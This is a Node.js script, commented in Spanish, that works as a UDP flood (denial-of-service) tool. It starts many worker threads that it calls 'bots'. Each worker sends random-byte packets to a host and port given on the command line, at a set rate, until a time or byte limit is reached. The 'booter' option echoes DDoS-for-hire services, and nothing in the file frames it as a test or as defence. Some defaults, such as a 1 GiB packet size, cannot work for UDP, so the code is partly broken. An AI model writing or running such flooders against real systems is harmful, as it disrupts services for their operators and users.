const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const crypto = require('crypto');

// Obtener los parámetros de la línea de comandos
const args = process.argv.slice(2);
const HOST = args[0] || 'localhost';
const PORT = parseInt(args[1], 10) || 41234;
const TIME = parseInt(args[2], 10) || 1000000; // Tiempo en milisegundos
const THREADS = parseInt(args[3], 10) || 1024; // Número de hilos
const PPS = parseInt(args[4], 10) || 1000000; // Paquetes por segundo
const BOOTER = args[5] || 'default'; // Tipo de booter
const TOTAL_BYTES = parseInt(args[6], 10) || 1e12; // Total de bytes (1TB)
const PACKET_SIZE = parseInt(args[7], 10) || 1024 * 1024 * 1024; // Tamaño del paquete en bytes

if (isMainThread) {
    console.log(`Iniciando ${THREADS} bots para enviar hasta ${TOTAL_BYTES} bytes a ${HOST}:${PORT} durante ${TIME} ms con ${PPS} paquetes por segundo usando el booter ${BOOTER}.`);

    // Crear hilos
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { HOST, PORT, TIME, PPS, BOOTER, TOTAL_BYTES, PACKET_SIZE }
        });
    }
} else {
    const client = dgram.createSocket('udp4');
    let bytesSent = 0;
    let packetsSent = 0;
    let errors = 0;

    const generateRandomPacket = (size) => {
        return crypto.randomBytes(size);
    };

    const sendPackets = () => {
        for (let i = 0; i < PPS; i++) {
            if (bytesSent >= workerData.TOTAL_BYTES) {
                clearInterval(interval);
                client.close();
                console.log(`Bot ${workerData.PORT} ha terminado y se ha cerrado.`);
                return;
            }
            const packet = generateRandomPacket(workerData.PACKET_SIZE);
            client.send(packet, 0, packet.length, workerData.PORT, workerData.HOST, (err) => {
                if (err) {
                    console.error('Error al enviar el mensaje:', err);
                    errors++;
                }
            });
            bytesSent += packet.length;
            packetsSent++;
        }
        console.log(`Bot ${workerData.PORT} está enviando ${PPS} paquetes por segundo a ${workerData.HOST}:${workerData.PORT} usando el booter ${workerData.BOOTER}. Total enviados: ${bytesSent} bytes en ${packetsSent} paquetes. Errores: ${errors}`);
    };

    // Enviar paquetes a intervalos regulares
    const interval = setInterval(sendPackets, 1000);

    // Cerrar el cliente después del tiempo especificado
    setTimeout(() => {
        clearInterval(interval);
        client.close();
        console.log(`Bot ${workerData.PORT} ha terminado y se ha cerrado.`);
    }, workerData.TIME);
}
